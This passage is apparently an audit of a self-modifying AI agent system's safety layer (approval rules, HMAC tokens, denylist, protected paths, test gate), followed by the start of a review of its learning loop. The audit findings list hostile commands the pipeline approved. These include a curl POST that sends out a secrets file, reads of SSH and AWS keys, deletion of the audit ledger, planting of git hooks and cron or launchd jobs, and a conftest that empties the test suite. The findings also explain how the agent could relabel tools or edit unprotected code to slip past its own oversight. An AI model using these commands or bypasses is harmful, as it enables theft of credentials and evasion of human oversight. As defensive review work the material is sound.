result.concern: Safety topology: Guardian rules, HMAC tokens, Execution tool protocol and sandboxes, protected paths, denylist, worktree landing, and what the self-modification path really permits.
result.summary_of_what_is_actually_there: Every tool call is an `action.proposed` message that only Guardian may subscribe to (simorgh/contracts/topics.py:291) and only Guardian/Kernel may answer with `action.approved` (topics.py:296); the bus client binds the publisher identity at construction (simorgh/bus/client.py:73,184), so a subsystem cannot spoof `source`. Guardian runs 12 rules in fixed order (simorgh/guardian/rules.py:743-756): paused, mode, protected, scope (always abstains, rules.py:337-349), denylist (13 regexes), bandit static analysis (HIGH only), shellcheck (not installed on this machine), package, grant (guards a `grant_capability` tool that is not registered anywhere), immunity, budget, reversibility. On approval it mints an HMAC over (action_id, tool, sha256(args), expiry) with a per-run secret held only by guardian and execution (simorgh/kernel/registry.py:50); Execution re-fetches the args from the ledger's `received` event and re-verifies before running (simorgh/execution/verifier.py:37-57, service.py:751-770). There are 98 builtin tools plus 3 worktree tools: 37 read_only, 51 reversible, 11 irreversible. The `reversibility` label Guardian evaluates is supplied by the proposer, Orchestration (simorgh/orchestration/tools.py:693-716), from a table filled by `tool.registered` messages; Guardian does not subscribe to `tool.registered` and has no independent view of any tool. In `guarded` mode, read_only and reversible proposals are allowed outright; irreversible ones escalate to a human only if `irreversible_requires_human` is true, and the Kernel sets that to False when `simorgh.toml` has no `[guardian]` section (simorgh/kernel/service.py:203), which the live `~/.simorgh/simorgh.toml` does not. So, live, every proposal that survives the deny rules runs without a human. File tools (`apply_source_patch`, `replace_in_file`, `apply_skill`) enforce repo-relative write scopes (`simorgh/`, `tests/`, `tools/`, `docs/`, `simorgh_skills/`, `workspace/`) and reads go through `pathsafety.resolve_safe_path` with credential-name and symlink/hardlink checks. `run_shell` runs `subprocess.run(shell=True)` in the repo or worktree with credentials stripped from the child env and a 32-pattern accident list (simorgh/execution/shell.py:53-118); `run_script` runs real Python with the repo importable and network; `run_python_sandboxed` and `SkillTool` run `python -I` with rlimits, an empty env and no filesystem confinement (tools.py:1016-1075, 2761-2830). Patch and skill tasks work in a git worktree under `~/.simorgh/execution/worktrees` and land via rebase, a whole-suite gate run on a copy, and `git merge --ff-only` (simorgh/execution/worktree.py:190-260); chat sessions edit the live tree directly (orchestration/session.py:59). Protected paths are a 12-entry substring list matched against `subject`/`path` arguments and, for `code`/`command` payloads, against path-looking tokens in the program text when it also looks like a write (rules.py:212-232, 272-334). The bootloader `simloader.py` gates each boot on the core suite with a run-count baseline (simloader.py:655-696) and rolls back to the last `sim-good-*` tag. External surfaces are in good shape: Telegram is deny-by-default with an allow-list (interface/telegram.py:82-187, contracts/channels.py:106), and the HTTP API bound to 0.0.0.0 has `SIM_API_TOKEN` configured (secrets.toml contains the key; httpapi.py:224-242).
strengths: Approver/executor split with independent re-verification is real, not decorative: Execution re-reads the args from the ledger `received` event and recomputes the HMAC (simorgh/execution/verifier.py:37-57; service.py:715-770), and the secret is scoped to only guardian and execution (kernel/registry.py:50; kernel/context.py:116-122).

Bus identity is bound per client, not per message: `self._source` is fixed at construction and `check_publish` uses it (simorgh/bus/client.py:73,184), with publisher/subscriber allow-lists on the action topics (contracts/topics.py:289-300). Orchestration cannot publish `action.approved`.

Deny-first, order-fixed pipeline with 'abstain' as a distinct verdict, and the explicit rule that a missing optional linter abstains rather than allows (rules.py:437-470, 497-509). Good discipline for a one-person project.

`run_remote` is correctly shaped: the host, user and key come from the operator's environment, never from the model, BatchMode and strict host keys by default (simorgh/execution/remote.py:14-33, 108-125).

`run_container` is the only tool whose isolation actually runs the right way (no bind mount of the repo, image-prefix allowlist, registry-host spoof check) (simorgh/execution/container.py:1-25, 46-75).

The bootloader's gate has learned from three demonstrated attacks: exit code must be 0, the summary must not report failures, tests must have RUN, and the count may not shrink more than 10% from the last green baseline; untracked conftest/pytest.ini refuse a bless (simloader.py:486-500, 655-696).

External chat surfaces are gated correctly: Telegram deny-by-default allow-list (interface/telegram.py:109-110, 186-187; contracts/channels.py:106-118) and the LAN-bound HTTP API has a configured bearer token (SIM_API_TOKEN present in ~/.simorgh/secrets.toml; httpapi.py:224-242, 593).
`pathsafety` closes the symlink, hardlink and case-folding read bypasses that observers found, with the resolved path re-checked against readable roots (simorgh/execution/pathsafety.py:150-215).
Shell child env strips credential-shaped variables (shell.py:126-141) and `run_script` passes a curated env list rather than os.environ (config.py:217-222).

findings.title: Live default auto-approves every irreversible action, so the door lock, sirens and shell run with no human in the loop
findings.claim: With the live config (no `[guardian]` section in ~/.simorgh/simorgh.toml) the Kernel sets `irreversible_requires_human=False` (kernel/service.py:203), Guardian has no house-specific rule and does not recompute `classify_call`, and `HomeCallTool` computes the `human` class but never refuses on it, so `home_call lock.unlock`, `cam_siren`, `ring_siren`, `run_shell`, `run_script` and `install_package` are all approved with nobody asked.
evidence: simorgh/kernel/service.py:203 `guardian_section.setdefault("irreversible_requires_human", False)`
~/.simorgh/simorgh.toml has sections [voice] [interface] [execution] [cognition] and no [guardian]; `env | grep SIMORGH` prints nothing
`grep -rn classify_call simorgh/` -> only contracts/home/policy.py, execution/home/tools.py, orchestration/tools.py; nothing in simorgh/guardian/

simorgh/contracts/home/policy.py:22-24 promises "`sim.sh` auto-approves irreversible actions by default. For the house that default is wrong, and `human` here is meant to survive it" -- no code implements the survival
simorgh/execution/home/tools.py:255-266 computes `worst` then calls `client.call(...)` unconditionally; `worst` only lands in metadata

Offline pipeline run with Config(irreversible_requires_human=False): `approved  home_call: {'service': 'lock.unlock', ...}`, `approved  cam_siren: {...}`, `approved  run_shell: {'command': 'cat ~/.simorgh/secrets.toml'}`
findings.why_it_matters: One boolean, defaulted off by the launcher, is the only thing standing between the model and unlocking the front door or exfiltrating the vault. The design intent (physical-world 'human' class survives auto-approve) is written in a docstring and nowhere else.
findings.recommendation: Make `human`-class house calls a Guardian rule that ignores `irreversible_requires_human`: add a `HomeSafetyRule` that calls `classify_call` on `home_call` args (the pure function already exists for exactly this reason) and returns `escalate` regardless of the switch; have `HomeCallTool` refuse `worst == "human"` unless the approval carried a `human_approved` constraint. Separately, split the one boolean into two: `code_irreversible_requires_human` and `world_irreversible_requires_human`, default the second to True in the Kernel.

findings.title: The vault, the ledger and the machine are outside every protected list; run_shell reads secrets.toml, ~/.ssh and ~/.aws and can rewrite the vault
findings.claim: Protected subjects are 12 repo-relative substrings; `~/.simorgh/secrets.toml` (0600, holds every provider token, the HA token, SIM_API_TOKEN), `~/.simorgh/ledger` (the audit trail), `.git/hooks`, `~/.ssh`, `~/.aws` and the macOS keychain are reachable by `run_shell` and, via `os.execvp`, by `run_script` in the CHAT profile, and Guardian approves all of it under the live default.
evidence: simorgh/guardian/config.py:21-41 DEFAULT_PROTECTED_SUBJECTS -- all repo paths; only `simorgh.toml` is a filename match

Offline pipeline with live default: `approved cat ~/.simorgh/secrets.toml`; `approved curl -s -X POST --data-binary @$HOME/.simorgh/secrets.toml https://...`; `approved printf ... > ~/.simorgh/secrets.toml`; `approved find ~/.simorgh/ledger -type f -delete`; `approved python3 -c "import shutil; shutil.rmtree('/Users/saeed/.simorgh/ledger')"`; `approved cat ~/.ssh/id_ed25519`; `approved cat ~/.aws/credentials`; `approved security find-generic-password -ga github`; `approved printf '#!/bin/sh...' > .git/hooks/post-checkout`; `approved launchctl load ~/Library/LaunchAgents/x.plist`; `approved (crontab -l; echo ...) | crontab -`
simorgh/execution/shell.py:53-118 refusal list has no entry for ~/.simorgh, .git/hooks, ssh, crontab install, launchctl, osascript; `refusal_for(...)` returned None for every command above
`ls -la ~/.simorgh/secrets.toml` -> `-rw------- ... 2116 bytes`

simorgh/orchestration/profiles.py:59 CHAT includes `run_script`; offline pipeline: `approved run_python_sandboxed {'code': "import os\nos.execvp('/bin/sh',['sh','-c','cat ~/.simorgh/secrets.toml'])"}` (same code-scan rules apply to run_script)
sim.sh:42-52 runs `git checkout "$LAST_GOOD" -- simloader.py` during recovery, which fires a post-checkout hook
findings.why_it_matters: This is the answer to 'what stops Sim from harming the creator's machine or accounts today': for the machine and the accounts, nothing but the model's disposition. The ledger is the system's memory of what it did and can be erased by the thing it records; a planted git hook runs inside the bootloader's own rollback path; the vault can be repointed at an attacker's Home Assistant.
findings.recommendation: Stop trying to enumerate bad commands and confine the process instead. On macOS, run every subprocess-spawning tool (`run_shell`, `run_script`, `SkillTool`, `run_python_sandboxed`) under `sandbox-exec` with a profile that denies reads of `~/.simorgh/secrets.toml`, `~/.ssh`, `~/.aws`, the keychain, and writes to `~/.simorgh/ledger`, `.git/hooks`, `~/Library/LaunchAgents`; or run them as a separate low-privilege user. Until then: add `~/.simorgh/`, `.git/`, `~/.ssh`, `~/.aws`, `~/Library` to the protected substring list (cheap, one line, closes the literal cases the pipeline already catches for `simorgh.toml`), and move the ledger to a path the sandbox denies.

findings.title: Protected paths are enforced on the proposal's text, not on the diff that lands; a glob or a concatenated string walks straight through, and worktree_land never re-checks
findings.claim: ProtectedRule is a substring scan of path-looking tokens in the command/code (rules.py:152-161, 212-232) and its docstring admits 'a path assembled from pieces already defeats the scan'; `WorktreeManager._land` rebases and fast-forwards whatever the branch contains with no `git diff --name-only` check against protected subjects, so the one place a protected-path check is cheap and exact has none.
evidence: Offline pipeline (live default): `denied cp workspace/rules.py simorgh/guardian/rules.py` but `approved cp workspace/rules.py simorgh/guardi*/rules.py && git add -A && git commit -qm x` and `approved python3 -c "open('simorgh/gu'+'ardian/rules.py','w').write('')"`
simorgh/execution/worktree.py:190-260 `_land`: status -> rebase -> gate -> `git merge --ff-only`; no path inspection of `main_sha..branch_sha`
simorgh/guardian/rules.py:147-151 'Deliberately crude ... under-matching costs the whole protection model, which is the trade this makes'

Offline pipeline: `approved cd /Users/saeed/ws/Simorgh && git add -A && git commit -qm 'direct to main'` (shell refusal only matches `git -C .../Simorgh`, shell.py:107-108) -- landing can be bypassed entirely by cd-ing to the live checkout
findings.why_it_matters: The corrigibility boundary (guardian/, execution/, contracts/, kernel/, simloader.py) is the load-bearing safety idea of the whole system and it is enforced by a regex over model text. The landing step already has the exact list of touched files for free.
findings.recommendation: In `_land`, run `git diff --name-only <main_sha>..<branch_sha>` and refuse if any path matches `protected_subjects` (pass the list in from Guardian's config or duplicate the 12 strings; it is a 6-line change). Do the same in the bootloader's bless. Add `cd`-to-repo-root and `git commit` outside the worktree to the shell refusals, or better, run `run_shell` from a worktree with `GIT_DIR`/`GIT_WORK_TREE` unset and the live checkout path made unreadable by the sandbox.

findings.title: Skills are persistent, unconfined arbitrary code labelled 'reversible', so they never reach the human even with auto-approve off
findings.claim: `apply_skill` and every `skill:<name>` tool are `reversibility="reversible"` and therefore auto-allowed in guarded mode regardless of `irreversible_requires_human`; the skill runs `python -I` with rlimits, empty env, cwd=repo_root and no filesystem or network confinement, and the denylist/bandit scan on `apply_skill` misses `os.execvp`, `asyncio.create_subprocess_shell` and `pathlib.write_text` to a concatenated path.
evidence: simorgh/execution/tools.py:2385-2388 ApplySkillTool `reversibility = "reversible"`; tools.py:2775-2776 SkillTool `reversibility = "reversible"`; tools.py:2800-2815 subprocess.run with `cwd=str(self._config.repo_root), env={}` and the comment 'A skill already runs as arbitrary Python with no filesystem confinement'

Offline pipeline with DEFAULT Config (irreversible_requires_human=True, bandit installed): `approved apply_skill {... os.execvp('/bin/sh', ['sh', '-c', text]) ...}`, `approved apply_skill {... asyncio.create_subprocess_shell(t) ...}`, `approved apply_skill {... pathlib.Path('simorgh/gu' + 'ardian/rules.py').write_text(text) ...}`, `approved skill:helper {'text': 'cat ~/.simorgh/secrets.toml'}`; only `os.popen` was caught (bandit B605)

simorgh/execution/service.py:776-785 lazy-loads any `skill:<name>` from `simorgh_skills/<name>.py` on demand after a restart, and `_load_skill` re-reads the file from disk (service.py:634-650), so a `run_shell` edit to a skill file is executed on next call
findings.why_it_matters: The 'reversible' label is what the pipeline actually gates on, and it is assigned by the tool author's guess, not by what the payload does. A skill is the one tool that survives restarts, so this is the persistence channel.
findings.recommendation: Label `apply_skill` and `skill:*` irreversible (they are), and give SkillTool the same confinement as the rest (sandbox-exec profile, no network). Longer term, drop `reversibility` as a per-tool constant and make it a per-proposal function of (tool, args), which the home tools already do -- generalise `to_action_payload`'s `home_call` special case into a table of classifiers.

findings.title: The landing gate is weaker than the bootloader's gate and can be neutered by an edit to tests/, which Sim may write
findings.claim: `RunTestsTool._run_isolated` treats pytest exit 5 (nothing collected) as ok and never checks the summary line or a run-count baseline, while `simloader.unit_verdict` does all three; `tests/` is in `write_scopes_source` and excluded from ProtectedRule's path scan, so a branch that adds `tests/conftest.py` with `pytest_collection_modifyitems(...): items.clear()` passes `worktree_land` and reaches main.
evidence: simorgh/execution/tools.py:~1372 `no_tests = completed.returncode == _PYTEST_NO_TESTS_COLLECTED or usage_error`; `ok = completed.returncode == 0 or no_tests`; used by `gate()` at tools.py:1272-1277 which `_land` calls

simloader.py:655-696 `unit_verdict`: refuses exit 5, refuses 'N failed' on exit 0, refuses `ran <= 0`, refuses `ran < baseline*0.9` -- three attacks named in its docstring, none carried into the landing gate
simorgh/execution/config.py:105 `write_scopes_source` includes `"tests/"`; rules.py:155-161 `_mentioned_paths` drops any token starting with `tests/`

Offline pipeline: `approved apply_source_patch {'subject': 'tests/conftest.py', 'code': 'def pytest_collection_modifyitems(config, items):\n    items.clear()\n'}` and `approved run_shell printf ... > tests/conftest.py`; `ls tests/conftest.py` -> does not exist today, so it would be a new file
findings.why_it_matters: 'Only the test suite as gate' is exactly right as a description, and Sim can edit the gate. The loader would catch it at the next boot and roll back, but the commit is on main until then and every other task rebases onto it.
findings.recommendation: Extract `unit_verdict` (and the baseline file) from simloader.py into `contracts/` and call it from `_run_isolated` when `target == "tests"`. In `_land`, refuse a branch whose diff touches `conftest.py`, `pytest.ini`, `pyproject.toml` or deletes test files unless a human approved that specific landing.

findings.title: Guardian trusts the proposer's reversibility label and has no view of the tool registry
findings.claim: Guardian builds `ToolInfo` from `p["reversibility"]` in the proposal (service.py:504, 522-526) and does not consume `tool.registered`; the label comes from Orchestration's `_TOOL_POLICY` (orchestration/tools.py:630-636, 693), and `simorgh/orchestration/` is writable and not protected, so a self-patch to one table (or one `replace_in_file`, approved reversible) re-labels `run_shell` as read_only and every mode/reversibility rule then treats it as a read.
evidence: simorgh/guardian/service.py:97-110 `consumes` has no TOOL_REGISTERED; service.py:522-526 `ToolInfo(name=proposal.tool, read_only=proposal.reversibility == "read_only", reversibility=proposal.reversibility)`
simorgh/orchestration/tools.py:693 `reversibility, network = _TOOL_POLICY.get(tool, ("irreversible", False))`
Offline pipeline: `approved replace_in_file {'path': 'simorgh/orchestration/tools.py', ...}` (orchestration is not in DEFAULT_PROTECTED_SUBJECTS, guardian/config.py:21-41)
contracts/home/policy.py:5-8 states the intent 'so Guardian never has to trust a label the proposer supplied' -- Guardian does exactly that
findings.why_it_matters: The HMAC binds the decision to the args, but the decision itself was made on a label the (unprotected) proposer chose. The corrigibility boundary is drawn around guardian/execution/kernel/contracts, yet the input that most of the pipeline branches on originates outside it.
findings.recommendation: Have Guardian subscribe to `tool.registered` and keep its own name->reversibility map (Execution is protected; its declarations are the trustworthy source), ignoring the proposal's field except for the `home_call` per-call classification, which Guardian should recompute itself with `classify_call`. Consider adding `simorgh/orchestration/tools.py` and `profiles.py` to the protected list.

findings.title: The HMAC token is real between processes and ceremony within one; the actual attack surface is upstream of it
findings.claim: Inside one Python process every subsystem shares an interpreter, so the token defends against bugs and accidental publishes (which it has genuinely caught -- the redelivery/replay case) rather than against a compromised peer; meanwhile the decisions it seals are made on unverified inputs (finding above) and the effects it gates run unconfined (findings above).
evidence: simorgh/contracts/security.py:37-58 HMAC over action_id|tool|args_sha|expiry; verifier.py:43-57

simorgh/kernel/registry.py:50 `NEEDS_HMAC_SECRET = {"guardian","execution"}` -- the secret is scoped, which is the right shape, but a Worker (kernel/service.py:604-641) is a separate process only in the multi-process configuration
simorgh/guardian/service.py:139-157 the dedupe map exists because a redelivered proposal minted a second token that then tripped the replay guard -- the mechanism catches ordinary faults
findings.why_it_matters: Not wrong, and cheap; but the creator should not read 'HMAC re-verified by Execution' as the safety story. It proves the executed action is the approved action; it says nothing about whether the approval was sound or the effect bounded.
findings.recommendation: Keep it, document its actual threat model in one sentence ('proves what ran is what was approved; not a defence against in-process code'), and spend the next effort on process confinement, which is where the missing boundary is.

findings.title: Physical-world tools are gated identically to code: one label, one boolean, no channel-level distinction
findings.claim: The 21 house/camera/Ring tools and 17 TV/media tools use the same `reversibility` constant and the same ReversibilityRule as file edits; `cam_setup`, `cam_stream`, `cam_ptz`, `cam_light`, `ring_setup`, `cast_*`, `tv_key` are all `reversible` and therefore never escalate in any mode; the only per-call classification is `home_call`, computed at proposal time without device_class or alarm state and then discarded by the tool.
evidence: Tool enumeration: 98 tools, Counter({'reversible': 51, 'read_only': 37, 'irreversible': 10}); e.g. `cam_ptz ro=False rev=reversible`, `tv_key rev=reversible`, `cast_play rev=reversible`

simorgh/orchestration/tools.py:698-704 classifies `home_call` with `args.get("target")` and `data` only; execution/home/tools.py:255-262 classifies again with device_class and alarm_state, stores `worst` in metadata
simorgh/guardian/rules.py:720-740 ReversibilityRule is the only place physical vs code is decided, via the same `r` string
findings.why_it_matters: For one family on one laptop the right question is not 'can this be undone' but 'does this act on the world'. A PTZ camera pointed at a neighbour or a TV turned to full volume at 2am is reversible and still not something a chat turn should do unattended.
findings.recommendation: Add a second axis to the tool protocol, `domain: code | world | self`, set once in each tool class, and give Guardian a `WorldRule` that escalates `world` actions from autonomous origins (curiosity/reflection/project) and lets human-originated chat ones through -- a small rule, and it reuses the `origin` field Guardian already tracks (service.py:242-244).

findings.title: Adaptive immunity never learns from shell or command rejections
findings.claim: `_remember_rejection` reads only `args["code"]`, so a denied `run_shell`/`run_container`/`run_remote` proposal (which carry `command`) is never added to the rejected index, and ImmunityRule can never match a re-worded shell attempt; the `guardian.review` path also runs only the denylist.
evidence: simorgh/guardian/service.py:644-648 `code = proposal.args.get("code")`; `if not isinstance(code, str) or not code: return`
simorgh/guardian/rules.py:352-368 `_code_text` was fixed to join `code` and `command` for the rules, but the remember side was not
simorgh/guardian/service.py:208-237 `_on_review` -> `layers_run: ["denylist"]`
findings.why_it_matters: Same 'one side implemented' shape the project already names as its dominant bug; the immunity feature is half-wired for the most dangerous tool.
findings.recommendation: Use `rule_defs._code_text(proposal)` in `_remember_rejection` and run the full pipeline's static rules (protected, denylist, bandit) in `_on_review`.

findings.title: Chat sessions edit the live checkout while patch tasks get a worktree, so the discipline covers the less common path
findings.claim: `WORKTREE_KINDS = {"patch","skill"}` so only those task kinds branch; the CHAT profile carries `apply_source_patch`, `replace_in_file`, `run_script` and `install_package`, all of which write to or run against the live tree the running process imported from, with no landing gate at all.
evidence: simorgh/orchestration/session.py:59 `WORKTREE_KINDS = frozenset({"patch", "skill"})`
simorgh/orchestration/profiles.py:12-66 CHAT tools include `apply_source_patch`, `replace_in_file`, `install_package`, `run_script`
simorgh/execution/tools.py:109-124 `tool_root` returns `config.repo_root` when `ctx.root is None`
docs/plans/worktree-landing-design.md 'Why' section lists 'a process standing on a moving floor' as the problem worktrees solve
findings.why_it_matters: The worktree design is right; the exemption swallows it. A chat turn is the most frequent way the creator drives Sim.
findings.recommendation: Restrict chat-profile writes to `workspace/` (the stated reason chat got write tools was 'write access to its workspace directory'), and route any `simorgh/`, `tests/`, `tools/`, `docs/` edit from chat through `start_task` so it gets a worktree and a landing.

findings.title: The hand-maintained denylist is doing security work it cannot do, and the project keeps paying to patch it
findings.claim: Thirteen regexes (guardian/config.py:46-79) plus 32 shell refusals (shell.py:53-118) plus bandit HIGH-only are the code-payload boundary; the rules module has 9 commits since 2026-09-07, most of them closing an observer-found bypass, and the denylist still misses `os.execvp`, `os.spawn*`, `os.fork`, `asyncio.create_subprocess_*`, `multiprocessing`, `importlib.import_module`, `curl`/`ssh` in a shell, and any concatenated path.
evidence: `git log --oneline --since=2026-09-07 -- simorgh/guardian/rules.py | wc -l` -> 9
shell.py:17-27 'Not an attempt at a security boundary -- a shell has no such thing'; config.py:213-215 same admission for `shell_refusals`
Offline pipeline with default Config and bandit on: `os.execvp` and `asyncio.create_subprocess_shell` payloads approved; `os.popen` denied (B605)
`which shellcheck` -> not installed, so ShellcheckRule abstains on this machine (rules.py:589-590)
findings.why_it_matters: The authors already know this; the finding is that the architecture leans on it anyway because there is no confinement layer beneath. Every observer wave will find another string.
findings.recommendation: Treat the denylist as a linter for the model's habits (keep it, stop extending it) and put the security boundary in the OS: macOS `sandbox-exec` profiles per tool, or a dedicated user account for the subprocess-spawning tools. That single change makes findings 2, 4 and most of 3 moot.

measurements: Tool enumeration via `builtin_tools(Config(), secrets={})`: TOTAL 98; Counter({'reversible': 51, 'read_only': 37, 'irreversible': 10}); plus 3 worktree tools (worktree_land irreversible)
Irreversible tools: cam_siren, install_package, memory_forget, notify, overheard_note, ring_siren, run_container, run_script, run_shell, sim_command, worktree_land

Guardian pipeline: 12 rules ['paused','mode','protected','scope','denylist','static_analysis','shellcheck','package','grant','immunity','budget','reversibility']; ScopeRule always abstains; grant_capability tool not registered anywhere

The live toml has sections [voice] [interface] [execution] [cognition] and no [guardian]; `env | grep SIMORGH` shows nothing. Reproducing the Kernel's exact steps offline gives `live effective: False | dataclass default: True`. (2) Guardian has no house rule: DEFAULT_PIPELINE (guardian/rules.py:743-756) ends in ReversibilityRule, which reads `proposal.reversibility` as supplied (rules.py:725) and, for "irreversible" with the flag False, returns allow (rules.py:738-740). `grep classify_call simorgh/` hits only contracts/home, execution/home/tools.py and orchestration/tools.py; nothing under simorgh/guardian/. The orchestration comment at orchestration/tools.py:697-698 ("Guardian recomputes the same answer") is therefore false today. The only other escalation path, the LLM classifier hook (pipeline.py:40), is `classifier_enabled: bool = False` by default (guardian/config.py:105) and only runs when an escalation already exists. (3) HomeCallTool computes `worst` (execution/home/tools.py:255-263) and then calls `client.call(...)` unconditionally (265-266); `worst` lands only in `metadata["safety"]`, and grep shows no consumer of that key and no `human_approved` constraint anywhere. result.concern: Cognitive core: Cognition (router/providers/budgets/prompt/compaction), Memory (store/recall/embeddings/consolidation), World Model / Self Model, and the growth loop (Learning, Reflection, Curiosity) -- whether it closes into changed behaviour, whether failover and the floor are sound, whether a session is coherent across chat/voice/tasks, and which packages earn their existence.
result.summary_of_what_is_actually_there: Every model call goes through simorgh/cognition/service.py::_on_think: a PromptAssembler (assembler.py) makes three sequential bus requests (persona.voice, self.summary, and for chat world.env.query user_profile) to build protected system blocks, then flattens the caller's whole message list into ONE string of "[role] content" lines (assembler.py:70) which is sent as a single role:user message (service.py:339-340); tools are never passed to a provider (service.py:358 `tools=None`) -- tool use is a hand-rolled first-line "NAME: argument" marker protocol (service.py:67-93, parser.py:235-278, orchestration/tools.py:669-690). The Router (router.py) tries together -> claude_code_cli -> gemini -> ollama -> floor with a shared deadline, per-candidate time slices, a 30 s cooldown, one transient retry and a truncation retry; RollingWindowBudget (budget.py) replays the provider's whole `cognition:budget:<name>` ledger stream on every status/can_spend call. The live config (~/.simorgh/simorgh.toml) adds only an Ollama chat-only fallback; no routes, so `tier: strong` escalation is a no-op. Memory (memory/) stores every chat turn as an episodic record (service.py:195-250), Curiosity feed items and consolidation distillations as semantic, and skills as procedural; recall is a hashing-trick bag-of-words (embed.py, 256 sha256 buckets; config default `embedder="hashing"`, and the live toml has no [memory] section) over an incremental inverted index (recall.py); orchestration/context.py builds the memory block for every think from three recalls (8 matched + 6 most-recent + 5 per-speaker, capped at 4,000 chars) and that block is the only cross-turn context any channel has, because the CLI mints a uuid per typed line (interface/service.py:943), voice a uuid per spoken turn (voice/session.py:888, pipeline.py:353), and the designed per-session WorkingMemory (store.py:51-95) has no producer. World Model (worldmodel/) serves real env facets (capability map, file index, git state, tool registry, user profile) and an in-memory-only Self Model (selfmodel.py:16-23) rendered into every prompt's protected `self_summary` block, whose competence section is fed live by `learn.competence.updated`; `compute_gaps` is a stub returning `[], []` (selfmodel.py:400-406). Learning's only live path is OutcomeRecorder -> CompetenceTable (rebuilt from `learn:outcomes` at boot) -> the `learn.competence.updated` event; its PatchPipeline/Correlator/strategy code has no publisher and its health() is permanently `degraded` (learning/service.py:98-125). Reflection runs a per-task DriftTracker plus an LLM drift review at task end, an LLM critique for patch/skill/research/project tasks that is written into episodic memory, calibration and pattern mining on an hourly pass, distillation of solved tasks into `task.create{kind:skill}`, denial mining, and the domain alert/digest router; Planning consumes its patterns and drift, Guardian tightens posture on drift/critical health. Curiosity runs on the kernel's 3 s idle tick: gates on pause/auto-off/backlog/cooldown/budget, then samples a code area by four "drives", asks Cognition for an idea, and publishes `curiosity.candidate` which Planning turns into tasks; every tick, taken or skipped, is appended to `curiosity:ticks`.
strengths: Provider failover is genuinely battle-hardened and it works in production: router.py shares one deadline across candidates (`_share_of`, router.py:337-357), stamps the cooldown when the failure happens (router.py:207-212), records billable spend on failed calls (router.py:230-236, together.py `billable=`), and retries a reasoning-only truncation with doubled room (router.py:271-330). Measured from ~/.simorgh/ledger `cognition:calls`: 9,379 think calls, 0 floor replies.

Recall is O(query buckets), not O(store), and provably identical to the dense path: recall.py KindIndex keeps a cursor into the append-only stream and an inverted sparse index (recall.py:127-185), with `sum()` used deliberately so the indexed score equals the full-scan float (recall.py:147-171). At 2,746 episodic records this is far inside the 0.25 s budget.

Consolidation has a real fabrication guard, not just a prompt: `untraceable()` (memory/consolidation.py:78-111) refuses to store a distillation that names files, shas or identifiers absent from the transcript, and the service logs the refusal (memory/service.py:280-287). That is the right shape for an honesty check in a system that writes its own memory.

Per-provider budgets are durable across restarts because they are a fold of the Ledger (budget.py:30-33), and the Together provider prices cached vs uncached tokens from the response itself (together.py:170-215) rather than trusting a static table -- the cheap primary really is cheap: 6,991 Together calls cost $4.56 in total.

Autonomy is bounded in practice, not just on paper: Curiosity's `min_explore_interval_seconds`, backlog gate and `auto off` (curiosity/service.py:394-426) hold -- the last 20,000 ticks in the ledger are all `skipped_reason: autonomy_paused`, i.e. nothing spent.

Reflection -> Planning is a closed loop in the 'make work' sense: mined patterns (`reflect:patterns`, 3 events) and distillations (`reflect:distillation`, 7 `proposed` events) become real `task.create`/`task.created` via planning/service.py:264-266 and reflection/service.py:386-389; Guardian reacts to drift and critical health (guardian/service.py `_on_drift_detected`, `_on_health_finding`).

The Together provider is stdlib urllib with a fixed endpoint and a transport seam (together.py:128-160), and `MIN_REASONING_MAX_TOKENS` (together.py:56-66) encodes a lesson learned from a real billed-and-useless failure rather than a guess.

findings.title: The self-improvement loop is open: competence is polluted by chat turns, reaches the model only as one prompt line, and steers nothing
findings.claim: Outcome -> competence -> different behaviour does not exist today: 88.5% of recorded outcomes are task_type 'unknown' (every chat turn), the only consumer of a competence estimate is a rendered line in the self-summary prompt block, `self.gaps` always returns nothing, and `learn.strategy.suggest` has no publisher -- so Learning is write-only telemetry that surfaces in every prompt as 'Competence: unknown 97% (2466)'.
evidence: ledger measurement: `learn:outcomes 2714 events; by (type,succeeded): [(('unknown', True), 2403), (('research', False), 65), (('unknown', False), 63), (('research', True), 60), (('patch', True), 44), (('patch', False), 37) ...]`; `with strategy: 0 with stated_confidence: 0`; `last 300 outcomes by type: [('unknown', 299), ('patch:simorgh/interface', 1)]`
~/.simorgh/worldmodel/self/SELF.md (live, v42, 2026-09-18 17:09): `## How well I do it\n- unknown 97% (2466)`

simorgh/learning/outcomes.py:83-91 -- task_type defaults to "unknown" and is read from `task:<id>`'s first event's `kind`; a chat turn's task_id is its per-line session uuid (orchestration/worker.py:402-405) which Planning never `created`, so every chat turn is an 'unknown' success
simorgh/worldmodel/selfmodel.py:309-313 -- the competence section rendered into the protected `self_summary` block (cognition/assembler.py:58-60) sorts by samples, so 'unknown' is the first row

simorgh/worldmodel/selfmodel.py:400-406 `compute_gaps` returns `[], []`; simorgh/curiosity/drives.py:37-40 `_gap` falls back to `_UNKNOWN_AREA_GAP = 0.6` for every area -- the 'gap' drive is a constant

simorgh/learning/service.py:98-103 (and my grep of simorgh/ outside learning/: no reference to LEARN_STRATEGY_SUGGEST) -- nothing publishes `learn.strategy.suggest`; simorgh/learning/strategy.py:9-23 documents that no outcome ever carries a strategy
findings.why_it_matters: This is the headline claim of the project ('self-improving'). As built, the measured competence never changes provider choice, tool choice, step budget, escalation, or which area Curiosity explores; the single place it reaches the model is a line that is both wrong (chat turns are not a task type) and, after a restart, the ONLY competence line the model sees. A senior reviewer would call this an unclosed loop, not a self-improving agent.
findings.recommendation: Pick one concrete behaviour to close the loop on and wire it end to end before adding anything else: e.g. record outcomes only for Planning-created tasks (skip kind='chat' in OutcomeRecorder, as memory/service.py:217-222 already does for episodic writes), and have orchestration/session.py::_tier consult `CompetenceTable.success_rate(task_type)` to choose `tier: strong` or a higher step cap when the rate for that type is below 0.4 with >= 5 samples. Delete `compute_gaps` and the `gap` drive until a producer exists.

findings.title: Failover to the Claude Code CLI is invisible to the budget model and has cost 20x the primary in total
findings.claim: The second candidate in the default order has no price, no spend cap and an unknown per-call cost, so neither the per-request `max_cost_usd` gate nor the rolling spend cap can ever refuse it -- and the ledger shows 1,034 CLI calls reported at $99.32 against 6,991 Together calls at $4.56.
evidence: ledger measurement: `claude_code_cli budget events: 1034 total reported cost: $99.32`; `together budget events: 6991 total cost: $4.56` (i.e. ~$0.096/call vs ~$0.00065/call); `cognition:calls` by (purpose, provider): `('draft','claude_code_cli') 526, ('review','claude_code_cli') 287, ('chat','claude_code_cli') 214`
simorgh/cognition/config.py:96-99 -- `"claude_code_cli": ProviderConfig(max_calls=..., window_seconds=18_000.0, timeout_seconds=180.0)`: no `max_spend_usd`, no `price_in/out`

